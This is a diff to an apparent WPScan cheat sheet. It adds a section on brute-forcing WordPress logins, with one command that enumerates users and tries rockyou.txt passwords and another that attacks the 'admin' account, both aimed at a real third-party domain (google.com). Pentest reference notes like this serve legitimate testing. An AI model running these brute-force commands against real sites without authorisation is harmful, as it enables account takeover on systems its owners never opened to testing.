@@ -68,6 +68,14 @@ wpscan --url http://example.com   --api-token YOUR_API_TOKEN
 ```bash
 wpscan --url http://target.com --enumerate u   --api-token YOUR_API_TOKEN 
 ```
+# Login Page Username and Password Brute force
+```bash
+# Enumerate users and Brute passwords
+wpscan --url https://google.com/ -e u -P /usr/share/wordlists/rockyou.txt
+
+# Specific user Password Brute force
+wpscan --url https://google.com -U admin -P /usr/share/wordlists/rockyou.txt --threads 10   
+```
 
 ## Overall 
 ```bash
